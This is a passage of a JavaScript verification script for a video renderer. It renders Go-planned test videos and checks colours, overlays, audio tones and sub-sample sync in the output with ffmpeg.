        hasAudio: true, sourceWidth: 1920, sourceHeight: 1080, framing: { mode: 'fill', focusX: 0.5, focusY: 0.5, zoom: 1 },
        transitionIn: { type: 'cut', durationInFrames: 0 }, fadeOutFrames: 0,
        // Its sound (the first half) plays from a clearer copy made from 0 s of the
        // recording: 30 frames into the copy is 1 s into the recording.
        audio: { from: 0, durationInFrames: cut, trimBefore: 30, blendInFrames: 0, blendOutFrames: 0, gain: flat(cut), variant: { assetId: 'clear1200', trimBefore: 30 } },
      },
    ],
    audio: [
      {
        id: 'dlg', assetId: 'src700', role: 'dialogue', bus: 'source', from: cut, durationInFrames: total - cut, trimBefore: 0, gainDb: 0,
        fadeInFrames: 0, fadeOutFrames: 0, duckUnderDialogue: false, duckDb: 0, gain: flat(total - cut), variant: { assetId: 'clear1500', trimBefore: 30 },
      },
    ],
    dialogueRanges: [],
    overlays: [],
    sources: { src550: `${baseUrl}/src550.mp4`, src700: `${baseUrl}/src700.mp4`, clear1200: `${baseUrl}/clear1200.m4a`, clear1500: `${baseUrl}/clear1500.m4a` },
  };
};

const verifySound = (plan, result, outFile) => {
  check(result.code === 0, `sound: render.mjs exit code 0 (got ${result.code})`);
  if (result.code !== 0) say(result.stderr.split('\n').slice(-30).join('\n'));
  if (result.code !== 0 || !fs.existsSync(outFile)) return;
  const { total, cut } = SOUND;
  const x = samples(outFile, 0, total / FPS);
  const peak = (lv) => lv.reduce((m, v) => Math.max(m, v), -200);
  const span = (lv) => {
    const p = peak(lv);
    let first = -1, last = -1;
    lv.forEach((v, f) => {
      if (v > p - 24) {
        if (first < 0) first = f;
        last = f;
      }
    });
    return [first, last];
  };
  const rec1 = peak(toneLevels(x, 550)), rec2 = peak(toneLevels(x, 700));
  check(rec1 < -45 && rec2 < -45, `sound: the recordings themselves are not heard (550 Hz ${rec1.toFixed(1)} dB, 700 Hz ${rec2.toFixed(1)} dB)`);
  const c1 = toneLevels(x, 1200), c2 = toneLevels(x, 1500);
  check(peak(c1) > -30 && peak(c2) > -30, `sound: both clearer copies are heard (${peak(c1).toFixed(1)} dB, ${peak(c2).toFixed(1)} dB)`);
  const [a0, a1] = span(c1);
  check(a0 <= 1 && Math.abs(a1 + 1 - cut) <= 1, `sound: the clip's clearer copy plays from the right place, over its sound window (frames ${a0}–${a1}, window 0–${cut - 1}, ±1)`);
  const [b0, b1] = span(c2);
  check(Math.abs(b0 - cut) <= 1 && b1 >= total - 2, `sound: the dialogue track's clearer copy plays from the right place (frames ${b0}–${b1}, track ${cut}–${total - 1}, ±1)`);
};

// --- transitions, splits and cuts: plans as Go resolved them ---------------
const GO_PLANS = JSON.parse(fs.readFileSync(path.join(VIDEO_DIR, 'render', 'fixtures', 'transitions.json'), 'utf8'));
// The on-screen checks' geometry (D116), written by Go's QA tests.
const QA_ZONES = JSON.parse(fs.readFileSync(path.join(VIDEO_DIR, 'render', 'fixtures', 'qa-zones.json'), 'utf8'));

const goPlan = (name, baseUrl, doc = GO_PLANS) => {
  const plan = structuredClone(doc.plans[name]);
  const sources = Object.fromEntries(Object.entries(doc.media).map(([id, file]) => [id, `${baseUrl}/${file}`]));
  const files = Object.fromEntries(Object.entries(doc.resources ?? {}).map(([sha, file]) => [sha, `${baseUrl}/${file}`]));
  // Like the worker: every file the plan draws gets its URL, and nested plans
  // share the outer plan's media maps (editspec.FillNested).
  const fill = (p) => {
    p.sources = sources;
    if (p.resourceSources) p.resourceSources = Object.fromEntries(Object.keys(p.resourceSources).map((sha) => [sha, files[sha] ?? '']));
    for (const n of Object.values(p.nested ?? {})) fill(n.plan);
  };
  fill(plan);
  return plan;
};

// Framing that follows movement (D115): the vertical crop that follows keeps
// the red square where Go planned it (CropRect, the renderer's placement) and
// in the picture all the way; the crop held in the middle shows it only while
// it passes the middle.
const verifyFollow = (name, plan, result, outFile) => {
  if (!verifyBasics(name, plan, result, outFile)) return [];
  const { width: W, height: H } = plan;
  const follows = name === 'follow';
  check(follows ? (plan.clips[0].framing.path?.length ?? 0) > 2 : !plan.clips[0].framing.path, `${name}: the plan ${follows ? 'moves the crop with the subject' : 'holds the crop still'}`);
  for (const e of GO_PLANS.expect[name]) {
    const box = colorBox(outFile, e.frame, 'red', W, H);
    if (e.x + e.half < 0 || e.x - e.half > 1) {
      check(box.share < 0.002, `${name}: frame ${e.frame}: the square is out of the crop, as planned (red ${pctOf(box.share)})`);
      continue;
    }
    if (e.x - e.half < 0 || e.x + e.half > 1) {
      // Partly in the picture: cut off by the crop where Go said (the edge it overhangs).
      const edge = e.x < 0.5 ? box.x0 : box.x1;
      check(box.share > 0.001 && (e.x < 0.5 ? edge < 0.01 : edge > 0.99), `${name}: frame ${e.frame}: the crop cuts the square off at the ${e.x < 0.5 ? 'left' : 'right'} edge, as planned (red ${pctOf(box.share)})`);
      continue;
    }
    const cx = (box.x0 + box.x1) / 2;
    check(box.share > 0.01 && Math.abs(cx - e.x) < 0.04, `${name}: frame ${e.frame}: the square is where Go placed it (x ${cx.toFixed(3)} vs ${e.x}, red ${pctOf(box.share)})`);
    if (follows) check(box.x0 > 0 && box.x1 < 1, `${name}: frame ${e.frame}: the whole square is in the picture (${box.x0.toFixed(2)}–${box.x1.toFixed(2)})`);
  }
  return extractNamedFrames(outFile, name, GO_PLANS.expect[name].map((e) => [e.frame, `t${e.frame}`]));
};

/** Bounding box of pixels that are not the dark footage (captions and graphics), fractions of the frame. */
const brightBox = (file, frame, width, height) => {
  const px = regionPixels(file, frame, WHOLE);
  let n = 0, x0 = width, y0 = height, x1 = -1, y1 = -1;
  for (let y = 0; y < height; y++) {
    for (let x = 0; x < width; x++) {
      const i = (y * width + x) * 3;
      if (i + 2 >= px.length) break;
      if (Math.max(Math.abs(px[i] - 32), Math.abs(px[i + 1] - 32), Math.abs(px[i + 2] - 32)) > 60) {
        n++;
        if (x < x0) x0 = x;
        if (x > x1) x1 = x;
        if (y < y0) y0 = y;
        if (y > y1) y1 = y;
      }
    }
  }
  return n ? { n, x0: x0 / width, y0: y0 / height, x1: (x1 + 1) / width, y1: (y1 + 1) / height } : { n: 0, x0: 0, y0: 0, x1: 0, y1: 0 };
};

// The on-screen checks (D116) place captions and graphics where QA's geometry
// says the renderer draws them: the captions inside their band, the lower
// third inside its box, so "the captions cover a face" means what it says.
const verifyZones = (plan, result, outFile) => {
  if (!verifyBasics('qa-zones', plan, result, outFile)) return [];
  const { width: W, height: H } = plan;
  const tol = 0.02;
  for (const z of QA_ZONES.checks) {
    const b = brightBox(outFile, z.frame, W, H);
    const [zx0, zy0, zx1, zy1] = z.box;
    const inside = b.n > 0 && b.x0 >= zx0 - tol && b.y0 >= zy0 - tol && b.x1 <= zx1 + tol && b.y1 <= zy1 + tol;
    check(inside, `qa-zones: frame ${z.frame}: ${z.what} drawn inside QA's ${z.what} box (${b.x0.toFixed(3)},${b.y0.toFixed(3)})–(${b.x1.toFixed(3)},${b.y1.toFixed(3)}) within (${zx0},${zy0})–(${zx1},${zy1})`);
  }
  return extractNamedFrames(outFile, 'qa-zones', QA_ZONES.checks.map((z) => [z.frame, z.what.replace(/\s+/g, '-')]));
};

/** Mean RGB of a region (fractions of the frame) of one output frame. */
const meanColor = (file, frame, [x0, y0, x1, y1]) => {
  const r = spawnSync(
    FFMPEG,
    ['-hide_banner', '-loglevel', 'error', '-i', file, '-vf', `select=eq(n\\,${frame}),crop=iw*${x1 - x0}:ih*${y1 - y0}:iw*${x0}:ih*${y0},scale=1:1:flags=area`, '-frames:v', '1', '-f', 'rawvideo', '-pix_fmt', 'rgb24', '-'],
    { maxBuffer: 1 << 20 },
  );
  const b = r.stdout ?? Buffer.alloc(0);
  return b.length >= 3 ? [b[0], b[1], b[2]] : [NaN, NaN, NaN];
};

const COLORS = {
  red: [200, 60, 50], blue: [45, 85, 200], green: [50, 160, 80], white: [255, 255, 255], black: [0, 0, 0], magenta: [224, 33, 138],
  // The slide pictures' colours (see SLIDE_PICTURES).
  cyan: [0, 184, 217], orange: [255, 109, 0], lime: [139, 224, 0], violet: [123, 47, 247], spring: [0, 245, 160], yellow: [255, 212, 0],
};
const near = (rgb, name, tol = 45) => COLORS[name].every((v, i) => Math.abs(v - rgb[i]) <= tol);
// Regions clear of the dark square's path (it sits in the middle of every shot).
const LEFT = [0, 0, 0.16, 0.24], RIGHT = [0.84, 0, 1, 0.24], TOP = [0, 0, 0.3, 0.16], BOTTOM = [0, 0.84, 0.3, 1], WHOLE = [0, 0, 1, 1];

/** Share of a region's pixels near a named color. */
const shareNear = (file, frame, box, name, tol = 48) => {
  const px = regionPixels(file, frame, box);
  const want = COLORS[name];
  let hit = 0;
  const n = Math.floor(px.length / 3);
  for (let i = 0; i < n * 3; i += 3) {
    if (Math.abs(px[i] - want[0]) <= tol && Math.abs(px[i + 1] - want[1]) <= tol && Math.abs(px[i + 2] - want[2]) <= tol) hit++;
  }
  return n ? hit / n : NaN;
};
/** Share of a region's pixels that are near white (text). */
const shareLight = (file, frame, box) => {
  const px = regionPixels(file, frame, box);
  let hit = 0;
  const n = Math.floor(px.length / 3);
  for (let i = 0; i < n * 3; i += 3) if (Math.min(px[i], px[i + 1], px[i + 2]) > 215) hit++;
  return n ? hit / n : NaN;
};
const pctOf = (x) => `${(x * 100).toFixed(2)}%`;

/** The common contract checks for a Go-resolved plan's render; false when there's no output to look at. */
const verifyBasics = (name, plan, result, outFile) => {
  check(result.code === 0, `${name}: render.mjs exit code 0 (got ${result.code})`);
  if (result.code !== 0) say(result.stderr.split('\n').slice(-30).join('\n'));
  if (result.code !== 0 || !fs.existsSync(outFile)) return false;
  const v = probe(outFile).streams.find((s) => s.codec_type === 'video');
  check(Math.abs(Number(v?.nb_frames) - plan.durationInFrames) <= 1, `${name}: ${v?.nb_frames} frames vs plan ${plan.durationInFrames} (±1)`);
  return true;
};

// Resources: title card + logo (frames 0-59), logo in the top-right corner
// (66-113), end card over the picture with the logo (120-149), brand font file.
const verifyResources = (plan, result, outFile) => {
  if (!verifyBasics('resources', plan, result, outFile)) return [];
  for (const f of ['logo.svg', 'photo.png', 'brand.woff2']) check(MEDIA_HITS.has(f), `resources: the render fetched ${f} from the media server`);
  const center = [0.3, 0.05, 0.7, 0.62];
  const corner = [0.76, 0, 1, 0.3];
  const onTitle = shareNear(outFile, 40, center, 'magenta');
  const afterTitle = shareNear(outFile, 92, center, 'magenta');
  check(onTitle > 0.01 && afterTitle < 0.002, `resources: the title card draws the logo above its title (logo colour ${pctOf(onTitle)} of the middle, then ${pctOf(afterTitle)})`);
  const cornerBefore = shareNear(outFile, 40, corner, 'magenta');
  const cornerOn = shareNear(outFile, 92, corner, 'magenta');
  check(cornerOn > 0.01 && cornerBefore < 0.002, `resources: logo.corner keeps the logo top-right (logo colour ${pctOf(cornerBefore)} → ${pctOf(cornerOn)} of the corner)`);
  const before = meanColor(outFile, 100, [0, 0.8, 0.12, 1]);
  const veil = meanColor(outFile, 140, [0, 0.8, 0.12, 1]);
  check(before[2] > before[0] && veil[0] > 45 && veil[0] > veil[2] + 25, `resources: the end card shows its picture under the brand veil (rgb(${before.join(',')}) → rgb(${veil.join(',')}))`);
  const endLogo = shareNear(outFile, 140, [0, 0, 1, 1], 'magenta');
  check(endLogo > 0.003, `resources: the end card draws the logo (${pctOf(endLogo)} of the frame)`);
  return extractNamedFrames(outFile, 'resources', [[40, 'title-logo'], [92, 'corner-logo'], [140, 'endcard-picture']]);
};

// Nested: red (0-59), then Brand intro from 1 s in: green (60-89), blue
// (90-149), its lower third on until outer frame ~141. Its sound is in this
// plan's audio list (Go), its picture plays silent.
const verifyNested = (plan, result, outFile) => {
  if (!verifyBasics('nested', plan, result, outFile)) return [];
  const [r, g, b] = [30, 75, 120].map((f) => meanColor(outFile, f, TOP));
  check(near(r, 'red') && near(g, 'green') && near(b, 'blue'), `nested: red, then the nested cut's green and blue from 1 s in (rgb(${r.join(',')}) → rgb(${g.join(',')}) → rgb(${b.join(',')}))`);
  const strap = [0.04, 0.68, 0.5, 0.95];
  const on = shareLight(outFile, 120, strap);
  const off = meanColor(outFile, 148, strap);
  check(on > 0.004 && near(off, 'blue', 50), `nested: the nested cut's own lower third shows, then goes (light pixels ${pctOf(on)}; afterwards rgb(${off.join(',')}))`);
  const red = [bandDb(outFile, 550, 5, 55), bandDb(outFile, 550, 70, 145)];
  const green = [bandDb(outFile, 850, 64, 86), bandDb(outFile, 850, 100, 145), bandDb(outFile, 850, 5, 55)];
  const blue = [bandDb(outFile, 700, 95, 145), bandDb(outFile, 700, 5, 85)];
  // Outside its span a tone's band only holds what leaks from the neighbouring
  // tones' bands (about 34 dB down), so each must be at least 28 dB quieter there.
  const gone = (inside, ...outside) => inside > -30 && outside.every((o) => o < inside - 28);
  check(gone(...red), `nested: the outer shot's sound plays only in its span (550 Hz ${red[0]} dB, after ${red[1]} dB)`);
  check(gone(...green), `nested: the nested cut's first shot is heard in its span (850 Hz ${green[0]} dB; elsewhere ${green[1]}, ${green[2]} dB)`);
  check(gone(...blue), `nested: and its second shot after it (700 Hz ${blue[0]} dB; before ${blue[1]} dB)`);
  return extractNamedFrames(outFile, 'nested', [[30, 'outer'], [75, 'nested-green'], [120, 'nested-blue-strap']]);
};

// The name bar (D162, D163), Go-resolved: one graphic for the whole video over
// red (0-59), blue (60-119) and green (120-179), its name changing on the
// segments Go planned (Rosa 0, Ben 60, Rosa 120, Gil 150). The bar is solid all
// the way (the footage never shows through it); a new name starts dim on the
// exact frame its segment starts, then comes up, so the change is pinned to
// that frame.
const verifyNameBar = (plan, result, outFile) => {
  if (!verifyBasics('name-bar', plan, result, outFile)) return [];
  const bar = plan.overlays.find((o) => o.template === 'name.bar');
  const segs = (bar?.segments ?? []).map((s) => [s.from, s.params.name]);
  check(JSON.stringify(segs) === JSON.stringify([[0, 'Rosa'], [60, 'Ben'], [120, 'Rosa'], [150, 'Gil']]) && bar.from === 0 && bar.durationInFrames === plan.durationInFrames,
    `name-bar: Go planned one bar for the whole video with its segments (${JSON.stringify(segs)})`);
  const band = [0.6, 0.9, 0.95, 0.98];
  const shown = [[30, 'red'], [90, 'blue'], [165, 'green']].map(([f, c]) => [meanColor(outFile, f, TOP), meanColor(outFile, f, band), c]);
  check(shown.every(([top, b, c]) => near(top, c) && b.every((v) => v < 60)),
    `name-bar: the footage above, the solid bar below in every clip (${shown.map(([t, b, c]) => `${c} rgb(${t.join(',')}) / bar rgb(${b.join(',')})`).join('; ')})`);
  const text = [0.02, 0.87, 0.4, 0.99];
  for (const f of [60, 120, 150]) {
    const [before, at, after] = [f - 1, f, f + 8].map((n) => shareLight(outFile, n, text));
    check(before > 0.004 && at < before / 3 && after > 0.004, `name-bar: the name changes on frame ${f} exactly (light text ${pctOf(before)} → ${pctOf(at)} → ${pctOf(after)})`);
  }
  return extractNamedFrames(outFile, 'name-bar', [[30, 'rosa'], [59, 'rosa-last'], [60, 'ben-first'], [90, 'ben'], [140, 'rosa-on-green'], [165, 'gil']]);
};

// The house style (D198, D199), Go-resolved: the same three clips and names as
// name-bar, with the bar about half as tall over a printed name that sits above
// the bottom edge (0.80–0.88), names that never animate, large captions at the
// top, and a title card that Go gave the logo made for the dark background.
const verifyHouseStyle = (plan, result, outFile) => {
  if (!verifyBasics('house-style', plan, result, outFile)) return [];
  const bar = plan.overlays.find((o) => o.template === 'name.bar');
  const title = plan.overlays.find((o) => o.template === 'title.card');
  check(
    title?.params?.logo === 'logo-dark' && bar?.params?.height === 'half' && bar?.params?.animate === 'never' && plan.captions?.size === 'large',
    `house-style: Go planned the logo for dark backgrounds, a half-height bar that never animates and large captions (${title?.params?.logo}, ${bar?.params?.height}, ${bar?.params?.animate}, ${plan.captions?.size})`,
  );
  // The bar over the printed names, the footage below it.
  const inBar = [0.6, 0.81, 0.95, 0.86];
  const below = [0.6, 0.93, 0.95, 0.98];
  const shown = [[90, 'blue'], [165, 'green']].map(([f, c]) => [meanColor(outFile, f, inBar), meanColor(outFile, f, below), c]);
  check(
    shown.every(([b, under, c]) => b.every((v) => v < 60) && near(under, c)),
    `house-style: a bar about half as tall over the printed names, the footage below it (${shown.map(([b, u, c]) => `${c}: bar rgb(${b.join(',')}) / below rgb(${u.join(',')})`).join('; ')})`,
  );
  // Never animates: a new name is all there on its first frame.
  const text = [0.02, 0.79, 0.4, 0.9];
  for (const f of [60, 120, 150]) {
    const [at, after] = [f, f + 8].map((n) => shareLight(outFile, n, text));
    check(at > 0.004 && at > after * 0.7, `house-style: the name is all there on frame ${f} (light text ${pctOf(at)} → ${pctOf(after)})`);
  }
  const caps = shareLight(outFile, 100, [0.1, 0.02, 0.9, 0.24]);
  check(caps > 0.006, `house-style: large captions at the top (light text ${pctOf(caps)})`);
  return extractNamedFrames(outFile, 'house-style', [[30, 'title-dark-logo'], [60, 'ben-first'], [100, 'ben'], [165, 'gil']]);
};

// A layout pack's looks (D263–D265), Go-resolved, 1280x720 with a magenta
// brand background and a yellow accent: frames 0-44 side by side (Rosa red,
// Ben blue) with a wide gap and margin showing the brand's background and a
// yellow line round each picture; 45-89 picture in picture, Ben full frame
// and Rosa in a large round inset bottom left; from 96 the end.screen over
// green footage: the words on the left, the room for the next videos on the
// right showing the screen (never the footage). Name tags are on: Rosa's sits
// inside her circle.
const verifyLayoutPack = (plan, result, outFile) => {
  if (!verifyBasics('layout-pack', plan, result, outFile)) return [];
  const [side, pip] = plan.clips[0].conversation.shots;
  check(
    side?.backdrop === '#E0218A' && side.tiles.every((t) => t.border?.color === '#FFD400') && pip?.tiles[1]?.rect.w === pip?.tiles[1]?.rect.h && pip.tiles[1].radius > 0,
    `layout-pack: Go planned the brand's backdrop, accent lines and a round inset (${side?.backdrop}, ${side?.tiles.map((t) => t.border?.color).join('/')}, inset ${pip?.tiles[1]?.rect.w}×${pip?.tiles[1]?.rect.h})`,
  );
  const gap = meanColor(outFile, 20, [0.496, 0.3, 0.504, 0.7]);
  const margin = meanColor(outFile, 20, [0.002, 0.3, 0.012, 0.7]);
  const left = meanColor(outFile, 20, [0.05, 0.08, 0.15, 0.25]);
  const right = meanColor(outFile, 20, [0.55, 0.08, 0.65, 0.25]);
  check(near(gap, 'magenta', 60) && near(margin, 'magenta', 60) && near(left, 'red') && near(right, 'blue'),
    `layout-pack: side by side with the brand's background in the gap and the margin (gap rgb(${gap.join(',')}), margin rgb(${margin.join(',')}), rgb(${left.join(',')}) | rgb(${right.join(',')}))`);
  const line = meanColor(outFile, 20, [0.1, 0.0306, 0.3, 0.0345]);
  check(line[1] > 120 && line[0] > 150, `layout-pack: a yellow line along the top of Rosa's picture (rgb(${line.join(',')}))`);
  const main = meanColor(outFile, 67, [0.6, 0.1, 0.9, 0.3]);
  const inset = meanColor(outFile, 67, [0.065, 0.6, 0.095, 0.64]);
  const corner = meanColor(outFile, 67, [0.025, 0.478, 0.04, 0.505]);
  check(near(main, 'blue') && near(inset, 'red', 55) && near(corner, 'blue', 60),
    `layout-pack: Ben full frame, Rosa in a round inset bottom left, his picture outside the circle's corner (rgb(${main.join(',')}), inset rgb(${inset.join(',')}), corner rgb(${corner.join(',')}))`);
  // Her name tag sits inside the circle, centred at its foot (Go placed it: tag.box).
  const tile = pip?.tiles?.[1];
  const box = tile?.tag?.box;
  check(!!box, `layout-pack: Go placed the round inset's name tag inside the circle (${JSON.stringify(box)})`);
  if (box) {
    const W = plan.width, H = plan.height;
    const area = [(tile.rect.x + box.x) / W, (tile.rect.y + box.y) / H, (tile.rect.x + box.x + box.w) / W, (tile.rect.y + box.y + box.h) / H];
    // (The inset's bottom-left corner holds Ben's own tag, the full frame's, so only the box is measured.)
    const tag = shareLight(outFile, 67, area);
    check(tag > 0.003, `layout-pack: Rosa's name shows inside the circle (light text ${pctOf(tag)} in the box Go placed)`);
  }
  const room = meanColor(outFile, 200, [0.55, 0.15, 0.85, 0.4]);
  const words = shareLight(outFile, 200, [0.07, 0.3, 0.42, 0.75]);
  check(near(room, 'magenta', 60) && !near(room, 'green', 60), `layout-pack: the end screen leaves room for the next videos over the footage (rgb(${room.join(',')}))`);
  check(words > 0.01, `layout-pack: the end screen's words on the left (light text ${pctOf(words)})`);
  return extractNamedFrames(outFile, 'layout-pack', [[20, 'side-by-side'], [67, 'pip-circle'], [200, 'end-screen']]);
};

// Covering printed names in a layout (D182): side by side, Rosa (red, left)
// with the call app's name printed bottom left of her webcam, Ben (blue). The
// cut has a name bar, so Rosa's tile tag sits over her printed name, opaque;
// Ben's tile (nothing printed) keeps its picture there.
const verifyConversationNames = (plan, result, outFile) => {
  if (!verifyBasics('conversation-names', plan, result, outFile)) return [];
  const tiles = plan.clips[0].conversation.shots[0].tiles;
  const rosa = tiles.find((t) => t.member === 'rosa');
  const ben = tiles.find((t) => t.member === 'ben');
  const cv = rosa?.tag?.cover;
  check(!!cv && !ben?.tag?.cover, `conversation-names: Go put a cover on Rosa's tile tag only (${JSON.stringify(cv)})`);
  if (!cv) return [];
  const W = plan.width, H = plan.height;
  const area = (t, c) => [(t.rect.x + c.x + c.w * 0.3) / W, (t.rect.y + c.y + c.h * 0.25) / H, (t.rect.x + c.x + c.w * 0.7) / W, (t.rect.y + c.y + c.h * 0.75) / H];
  const covered = meanColor(outFile, 30, area(rosa, cv));
  const same = meanColor(outFile, 30, area(ben, cv));
  check(!near(covered, 'red', 80) && near(same, 'blue'), `conversation-names: Rosa's printed name is covered (rgb(${covered.join(',')})), Ben's tile shows his picture there (rgb(${same.join(',')}))`);
  return extractNamedFrames(outFile, 'conversation-names', [[30, 'covered']]);
};

// Conversation (D99): Rosa (red) frames 0-29, Ben (blue) 30-59, side by side
// 60-89, picture in picture (Ben, Rosa inset) 90-119, the grid (dissolving
// in) 120-143, a card over Ben 144-164. Every member's tone plays throughout:
// the picture switches, the sound doesn't.
const verifyConversation = (plan, result, outFile) => {
  if (!verifyBasics('conversation', plan, result, outFile)) return [];
  const shots = plan.clips[0].conversation.shots;
  check(shots.length === 6 && shots[2].layout === 'side-by-side' && shots[3].layout === 'pip', `conversation: Go planned six shots (${shots.map((s) => s.layout || s.kind).join(', ')})`);
  check(near(meanColor(outFile, 15, TOP), 'red') && near(meanColor(outFile, 45, TOP), 'blue'), `conversation: Rosa, then Ben, full frame (rgb(${meanColor(outFile, 15, TOP).join(',')}) → rgb(${meanColor(outFile, 45, TOP).join(',')}))`);
  const sbsL = meanColor(outFile, 75, [0.02, 0.04, 0.12, 0.16]);
  const sbsR = meanColor(outFile, 75, [0.88, 0.04, 0.98, 0.16]);
  check(near(sbsL, 'red') && near(sbsR, 'blue'), `conversation: side by side, Rosa left and Ben right (rgb(${sbsL.join(',')}) | rgb(${sbsR.join(',')}))`);
  const pipMain = meanColor(outFile, 105, TOP);
  const pipInset = meanColor(outFile, 105, [0.705, 0.6, 0.735, 0.64]);
  check(near(pipMain, 'blue') && near(pipInset, 'red', 55), `conversation: picture in picture, Ben full frame with Rosa in the corner (rgb(${pipMain.join(',')}), inset rgb(${pipInset.join(',')}))`);
  const g = meanColor(outFile, 138, [0.27, 0.53, 0.33, 0.6]);
  const gTop = [meanColor(outFile, 138, [0.02, 0.04, 0.1, 0.12]), meanColor(outFile, 138, [0.9, 0.04, 0.98, 0.12])];
  check(near(gTop[0], 'red') && near(gTop[1], 'blue') && g[1] > 175 && g[1] > COLORS.green[1] + 15, `conversation: the grid, Gil's webcam brightened by his look (green ${COLORS.green[1]} → ${g[1]}; tops rgb(${gTop[0].join(',')}) | rgb(${gTop[1].join(',')}))`);
  const dissolve = meanColor(outFile, 122, [0.02, 0.04, 0.1, 0.12]);
  check(dissolve[2] > 60 && dissolve[0] > 60, `conversation: the grid dissolves in over picture in picture (rgb(${dissolve.join(',')}) at its third frame)`);
  const cardText = shareLight(outFile, 156, [0.3, 0.35, 0.7, 0.65]);
  const cardBack = meanColor(outFile, 156, [0, 0, 0.2, 0.2]);
  check(cardText > 0.002 && Math.max(...cardBack) < 120, `conversation: the card shows its question over Ben softened (light text ${pctOf(cardText)}, background rgb(${cardBack.join(',')}))`);
  const tones = [550, 700, 850].map((hz) => [bandDb(outFile, hz, 5, 55), bandDb(outFile, hz, 65, 115), bandDb(outFile, hz, 125, 160)]);
  const all = tones.every((t) => t.every((v) => v > -32));
  check(all, `conversation: everyone's sound plays through every shot (550 Hz ${tones[0].join('/')}, 700 Hz ${tones[1].join('/')}, 850 Hz ${tones[2].join('/')} dB)`);
  const tags = shareLight(outFile, 75, [0.02, 0.85, 0.2, 0.97]);
  check(tags > 0.003, `conversation: name tags in the layout (light pixels ${pctOf(tags)})`);
  return extractNamedFrames(outFile, 'conversation', [[15, 'rosa'], [45, 'ben'], [75, 'side-by-side'], [105, 'pip'], [138, 'grid'], [156, 'card']]);
};

// Sync (D119): where each person's recording plays in the render, measured to
// a fraction of a sample. Ada's microphone starts with the call, Bo's 0.713 s
// in (21.39 frames at 30 fps). Without sampleAligned Bo starts on frame 22,
// trimmed to the nearest frame of his recording (13 ms early); with it he
// plays exactly 0.713 s after Ada; with his clock 208.3 ppm fast he keeps
// lining up as he drifts. Each lag is where cross-correlating the render with
// the recording peaks (parabolic sub-sample peak), in a window.
const decodeMono = (file) => {
  const r = spawnSync(FFMPEG, ['-hide_banner', '-loglevel', 'error', '-i', file, '-vn', '-ac', '1', '-ar', '48000', '-f', 'f32le', '-'], { maxBuffer: 256 << 20 });
  const b = r.stdout ?? Buffer.alloc(0);
  return new Float32Array(b.buffer.slice(b.byteOffset, b.byteOffset + Math.floor(b.length / 4) * 4));
};

/** The lag (seconds; output time minus recording time) near `expect` where the render best matches the recording's [from, to). */
const lagOf = (out, src, from, to, expect) => {
  const SR = 48000;
  const s0 = Math.round(from * SR), s1 = Math.min(src.length, Math.round(to * SR));
  const center = Math.round(expect * SR);
  const W = 960; // ±20 ms
  const corr = new Float64Array(2 * W + 1);
  for (let k = -W; k <= W; k++) {
    let c = 0;
    const L = center + k;
    for (let m = s0; m < s1; m++) {
      const n = m + L;
      if (n >= 0 && n < out.length) c += src[m] * out[n];
    }
    corr[k + W] = c;
  }
  let best = 1;
  for (let i = 1; i < corr.length - 1; i++) if (corr[i] > corr[best]) best = i;
  const a = corr[best - 1], b = corr[best], c = corr[best + 1];
  const frac = a - 2 * b + c === 0 ? 0 : (0.5 * (a - c)) / (a - 2 * b + c);
  return (center + best - W + frac) / SR;
};

const runSync = async (baseUrl, cache) => {
  const SR = 48000;
  const srcA = decodeMono(path.join(MEDIA, 'voice-a.wav'));
  const srcB = decodeMono(path.join(MEDIA, 'voice-b.wav'));
  const results = {};
  for (const name of ['sync-frame', 'sync-frame-drift', 'sync-sample', 'sync-drift']) {
    // A drifting recording plays from a copy resampled to the call's clock, made
    // with the very ffmpeg arguments the render worker uses (Go wrote them).
    for (const c of GO_PLANS.driftCopies?.[name] ?? []) {
      const args = c.args.map((x) => (x === '{in}' ? path.join(MEDIA, GO_PLANS.media[c.assetId]) : x === '{out}' ? path.join(MEDIA, c.file) : x));
      execFileSync(FFMPEG, args, { stdio: ['ignore', 'inherit', 'inherit'] });
    }
    const plan = goPlan(name, baseUrl);
    const propsFile = path.join(OUT, `plan-${name}.json`);
    fs.writeFileSync(propsFile, JSON.stringify({ plan }, null, 2));
    const outFile = path.join(OUT, `out-${name}.mp4`);
    say(`rendering ${name} ${plan.width}x${plan.height}, ${plan.durationInFrames} frames`);
    const result = await runNode('render.mjs', ['--props', propsFile, '--out', outFile, '--bundle-cache', cache]);
    if (!verifyBasics(name, plan, result, outFile)) continue;
    const out = decodeMono(outFile);
    // Bo's clock: his element's rate, or his drift copy's (the copy plays at rate 1).
    const rate = GO_PLANS.driftCopies?.[name]?.[0]?.rate ?? (plan.audio.find((a) => a.member === 'bo').playbackRate || 1);
    // Ada: her recording's start is the call's start (frame 0).
    const ada = lagOf(out, srcA, 0.5, 5.5, 0);
    // Bo, early and late in the render: output time = 0.713 + recording time / rate,
    // measured on one 40 ms burst each (his bursts start at 0.43 k − 0.11 s), so his
    // drift inside the window stays under a sample.
    const want = (tau) => 0.713 + tau / rate - tau; // the lag at recording time tau
    const early = lagOf(out, srcB, 1.175, 1.225, want(1.2));
    const late = lagOf(out, srcB, 4.185, 4.235, want(4.21));
    results[name] = { ada, early: early - ada - want(1.2), late: late - ada - want(4.21) };
    say(`  ${name}: Ada at ${(ada * 1e3).toFixed(3)} ms; Bo ${(results[name].early * 1e6).toFixed(1)} µs from where his pin puts him early on, ${(results[name].late * 1e6).toFixed(1)} µs late in (one sample is ${(1e6 / SR).toFixed(1)} µs)`);
  }
  const f = results['sync-frame'], fd = results['sync-frame-drift'], s = results['sync-sample'], d = results['sync-drift'];
  if (f) check(Math.abs(f.early) > 5e-3 && Math.abs(f.early) < 1 / 30, `sync: placed on frames, Bo plays ${(f.early * 1e3).toFixed(2)} ms from his pin (within a frame, as cuts made before placed him)`);
  // Before: a drifting recording went through ffmpeg's atempo, whose time wanders.
  if (fd) check(Math.abs(fd.early) < 2 / 30 && Math.abs(fd.late) < 2 / 30, `sync: placed on frames with his clock fast (atempo), Bo plays ${(fd.early * 1e3).toFixed(2)} ms and ${(fd.late * 1e3).toFixed(2)} ms from his pin`);
  if (s) check(Math.abs(s.early) < 1 / SR && Math.abs(s.late) < 1 / SR, `sync: placed to the sample, Bo plays ${(s.early * 1e6).toFixed(1)} µs and ${(s.late * 1e6).toFixed(1)} µs from his pin (under a sample, ${(1e6 / SR).toFixed(1)} µs)`);
  if (d) check(Math.abs(d.early) < 2 / SR && Math.abs(d.late) < 2 / SR, `sync: with his clock 208.3 ppm fast he stays lined up: ${(d.early * 1e6).toFixed(1)} µs early on, ${(d.late * 1e6).toFixed(1)} µs late in (under two samples)`);
};

/** Share and bounding box (fractions of the frame; px size) of a frame's pixels near a named colour. */
